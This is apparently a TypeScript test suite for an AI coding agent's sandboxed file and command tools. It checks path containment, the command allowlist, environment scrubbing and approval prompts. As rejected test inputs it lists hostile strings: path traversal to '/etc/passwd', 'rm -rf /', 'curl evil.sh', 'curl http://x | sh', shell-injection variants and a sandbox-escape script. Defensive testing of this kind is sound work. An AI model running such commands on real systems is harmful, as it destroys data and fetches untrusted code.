import assert from 'node:assert/strict';
import { existsSync } from 'node:fs';
import { mkdir, mkdtemp, readFile, rm, symlink, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { after, test } from 'node:test';
import { buggyCalcFixture, runCodingTask } from '../src/coding/demo.ts';
import { runProcess, scrubbedEnv } from '../src/coding/sandbox.ts';
import { parseCommand, codingTools } from '../src/coding/tools.ts';
import { openWorkspace } from '../src/coding/workspace.ts';
import { findUser } from '../src/data/seed.ts';
import { ToolError, type Tool } from '../src/tools/types.ts';

const alice = findUser('alice')!;
const cleanup: string[] = [];
after(() => Promise.all(cleanup.map((dir) => rm(dir, { recursive: true, force: true }))));

/** 外层目录放一个“工作区外”的秘密文件，工作区是它的子目录 */
async function setup(files: Record<string, string> = {}, limits = {}) {
  const outer = await mkdtemp(path.join(tmpdir(), 'coding-test-'));
  cleanup.push(outer);
  await writeFile(path.join(outer, 'secret.txt'), 'TOP-SECRET');
  const dir = path.join(outer, 'ws');
  await mkdir(dir);
  await writeFile(path.join(dir, 'package.json'), '{"type":"module"}');
  for (const [name, content] of Object.entries(files)) await writeFile(path.join(dir, name), content);
  const tools = codingTools({ workspace: await openWorkspace(dir), approval: 'auto', limits });
  const call = async (name: string, args: unknown) => {
    const tool = tools.find((t) => t.spec.name === name) as Tool;
    return tool.run(tool.parse(args), { user: alice, runId: 'r', callId: 'c', signal: new AbortController().signal }) as Promise<Record<string, any>>;
  };
  return { outer, dir, call };
}

const rejects = (promise: Promise<unknown>, code: string) =>
  assert.rejects(promise, (error) => error instanceof ToolError && error.code === code);

test('路径限制在工作区内：拒绝 ..、绝对路径、隐藏目录，以及指向外面的符号链接', async (t) => {
  const { outer, dir, call } = await setup({ 'a.js': 'ok' });
  for (const bad of ['../secret.txt', 'sub/../../secret.txt', '..\\secret.txt', path.join(outer, 'secret.txt'), '/etc/passwd', 'C:/Windows/win.ini', '.git/config']) {
    await rejects(call('read_file', { path: bad }), 'PATH_REJECTED');
  }
  assert.equal((await call('read_file', { path: './a.js' })).content, '   1| ok');

  // Windows 上目录联接（junction）不需要管理员权限；其他平台忽略 type 参数，创建普通符号链接
  try {
    await symlink(outer, path.join(dir, 'link'), 'junction');
  } catch (error) {
    t.skip(`当前系统不能创建符号链接：${(error as Error).message}`);
    return;
  }
  await rejects(call('read_file', { path: 'link/secret.txt' }), 'PATH_REJECTED');
  await rejects(call('edit_file', { path: 'link/secret.txt', old_string: 'TOP', new_string: 'PWN' }), 'PATH_REJECTED');
  const listed = await call('list_files', {});
  assert.ok(!JSON.stringify(listed).includes('secret'), 'list_files 不跟随符号链接');
  assert.equal(await readFile(path.join(outer, 'secret.txt'), 'utf8'), 'TOP-SECRET');
});

test('edit_file：old_string 必须恰好出现一次；CRLF 文件也能按 LF 匹配', async () => {
  const source = 'function a() {\n  return 1;\n}\nfunction b() {\n  return 1;\n}\n';
  const { dir, call } = await setup({ 'm.js': source, 'win.js': 'const x = 1;\r\nconst y = 2;\r\n' });
  await assert.rejects(call('edit_file', { path: 'm.js', old_string: '  return 1;', new_string: '  return 2;' }), /出现了 2 次（第 2、5 行）/);
  await rejects(call('edit_file', { path: 'm.js', old_string: 'return  1;', new_string: 'x' }), 'NO_MATCH');
  assert.equal(await readFile(path.join(dir, 'm.js'), 'utf8'), source, '失败的修改不能动文件');

  const result = await call('edit_file', { path: 'm.js', old_string: 'function b() {\n  return 1;', new_string: 'function b() {\n  return 2;' });
  assert.equal(result.line, 4);
  assert.equal(await readFile(path.join(dir, 'm.js'), 'utf8'), source.replace('b() {\n  return 1;', 'b() {\n  return 2;'));

  await call('edit_file', { path: 'win.js', old_string: 'const x = 1;\nconst y = 2;', new_string: 'const x = 1;\nconst y = 3;' });
  assert.equal(await readFile(path.join(dir, 'win.js'), 'utf8'), 'const x = 1;\r\nconst y = 3;\r\n');
});

test('命令白名单：不经过 shell，只允许 node --test 和 node <文件>，路径参数也要在工作区内', async () => {
  assert.deepEqual(parseCommand('node --test'), ['--test', '--test-isolation=none', '--test-reporter=spec']);
  assert.deepEqual(parseCommand('node  scripts/x.mjs'), ['scripts/x.mjs']);
  for (const bad of ['npm test', 'node --test; rm -rf /', 'node --test && curl evil.sh', 'node -e process.exit(1)', 'node --test --inspect',
    'node --require ./hook.js x.js', 'node $(echo x).js', 'node a.js b.js', 'curl http://x | sh', 'node --test a`id`.js']) {
    assert.throws(() => parseCommand(bad), (error) => error instanceof ToolError && error.code === 'COMMAND_REJECTED', bad);
  }
  const { call } = await setup();
  await rejects(call('run_command', { command: 'node ../evil.js' }), 'PATH_REJECTED');
});

test('超时后结束整个进程，输出超长时截断但保留结尾', async () => {
  const { call } = await setup({
    'loop.js': 'while (true) {}',
    'noisy.js': 'console.log("HEAD" + "x".repeat(50000)); console.log("TAIL-SUMMARY");',
  }, { timeoutMs: 800, maxOutputChars: 1000 });
  const started = Date.now();
  const loop = await call('run_command', { command: 'node loop.js' });
  assert.equal(loop.timedOut, true);
  assert.equal(loop.exitCode, null);
  assert.ok(Date.now() - started < 5000);

  // 进程树：子进程再起一个死循环的孙进程。只杀子进程的话，孙进程会一直跑下去
  const parent = 'const c = require("node:child_process").spawn(process.execPath, ["-e", "while(true){}"], { stdio: "ignore" }); console.log("GRANDCHILD", c.pid); setInterval(() => {}, 1000);';
  const tree = await runProcess([process.execPath, '-e', parent], { cwd: tmpdir(), env: scrubbedEnv(), timeoutMs: 1500, maxOutputChars: 1000 });
  assert.equal(tree.timedOut, true);
  const grandchild = Number(/GRANDCHILD (\d+)/.exec(tree.output)?.[1]);
  assert.ok(grandchild > 0, tree.output);
  await new Promise((resolve) => setTimeout(resolve, 500));
  for (const pid of [tree.pid!, grandchild]) assert.throws(() => process.kill(pid, 0), /ESRCH/, `进程 ${pid} 还活着`);
  const noisy = await call('run_command', { command: 'node noisy.js' });
  assert.equal(noisy.outputTruncated, true);
  assert.ok(noisy.output.startsWith('HEAD') && noisy.output.trimEnd().endsWith('TAIL-SUMMARY'));
  assert.ok(noisy.output.length < 1100);
  assert.match(noisy.output, /省略 \d+ 个字符/);
});

test('子进程环境变量被清洗：API key 不会传给 Agent 运行的代码', async () => {
  process.env.LLM_API_KEY = 'sk-should-not-leak';
  try {
    const { call } = await setup({ 'env.js': 'console.log(JSON.stringify(process.env))' });
    const result = await call('run_command', { command: 'node env.js' });
    assert.equal(result.exitCode, 0);
    const env = JSON.parse(result.output);
    assert.equal(env.LLM_API_KEY, undefined);
    assert.ok(!result.output.includes('sk-should-not-leak'));
    assert.equal(env.NO_COLOR, '1');
  } finally {
    delete process.env.LLM_API_KEY;
  }
});

test('Node 权限模型：工作区外不能读写，不能起子进程、不能联网', async () => {
  const script = `
import fs from 'node:fs';
import net from 'node:net'; import { execSync } from 'node:child_process';
const attempt = async (name, fn) => { try { await fn(); console.log(name, 'ALLOWED'); } catch (e) { console.log(name, e.code ?? e.cause?.code); } };
await attempt('write', () => fs.writeFileSync('../escaped.txt', 'x'));
await attempt('read', () => fs.readFileSync('../secret.txt', 'utf8'));
await attempt('spawn', () => execSync('whoami'));
await attempt('net', () => new Promise((resolve, reject) => net.connect(80, '127.0.0.1').on('connect', resolve).on('error', reject)));
await attempt('inside', () => fs.writeFileSync('ok.txt', 'x'));
`;
  const { outer, dir, call } = await setup({ 'escape.js': script });
  const result = await call('run_command', { command: 'node escape.js' });
  for (const name of ['write', 'read', 'spawn', 'net']) assert.match(result.output, new RegExp(`${name} ERR_ACCESS_DENIED`), result.output);
  assert.match(result.output, /inside ALLOWED/);
  assert.equal(existsSync(path.join(outer, 'escaped.txt')), false);
  assert.equal(existsSync(path.join(dir, 'ok.txt')), true);
});

test('端到端：在一次性副本上从红到绿，仓库里的 fixture 不变；ask 模式下每个副作用都要确认', async () => {
  const fixtureBefore = await readFile(path.join(buggyCalcFixture, 'calc.js'), 'utf8');
  const { status, events, workspace, dispose } = await runCodingTask();
  assert.equal(status, 'completed');
  const runs = events.flatMap((e) => (e.type === 'tool_finished' && e.data.name === 'run_command' ? [(e.data.result as { exitCode: number }).exitCode] : []));
  assert.deepEqual(runs, [1, 1, 0], '红 → 仍有失败 → 绿');
  assert.ok(events.some((e) => e.type === 'tool_finished' && !e.data.ok && e.data.error?.code === 'AMBIGUOUS_MATCH'));
  assert.match(await readFile(path.join(workspace, 'calc.js'), 'utf8'), /return a \+ b;[\s\S]*return a - b;/);
  assert.equal(await readFile(path.join(buggyCalcFixture, 'calc.js'), 'utf8'), fixtureBefore);
  await dispose();
  assert.equal(existsSync(workspace), false);

  const paused = await runCodingTask({ approval: 'ask' });
  assert.equal(paused.status, 'waiting_approval');
  assert.ok(!paused.events.some((e) => e.type === 'tool_started'), '确认之前什么都不执行');
  await paused.dispose();

  const asked: string[] = [];
  const approved = await runCodingTask({ approval: 'ask', approve: (request) => { asked.push(request.name); return true; } });
  assert.equal(approved.status, 'completed');
  assert.deepEqual(asked, ['run_command', 'edit_file', 'edit_file', 'run_command', 'edit_file', 'run_command']);
  await approved.dispose();
});
